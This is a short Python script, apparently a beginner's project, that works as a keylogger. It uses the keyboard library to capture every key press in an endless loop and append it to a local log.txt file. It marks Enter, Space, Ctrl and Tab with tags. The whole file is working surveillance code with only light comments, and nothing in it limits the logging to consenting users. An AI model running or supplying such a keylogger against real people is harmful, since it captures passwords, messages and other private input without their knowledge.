import keyboard



while True:
    with open("log.txt", 'a') as file:
        event = keyboard.read_event()
        #reads event
        
        if event.event_type == keyboard.KEY_DOWN:
        #detects when a key is pressed, via the #.KEY_DOWN event, ensuring it records once it is pressed
         
            if event.name == "enter":
                file.write("\n[ENTER]\n")
            
            elif event.name == "space":
                file.write("[SPACE]")

            elif event.name == "ctrl":
                file.write("[CTRL]")
            
            elif event.name == "tab":
                file.write("[tab]")
            
            else:
                file.write(f"{event.name}")
            #embedding variables inside
        
        
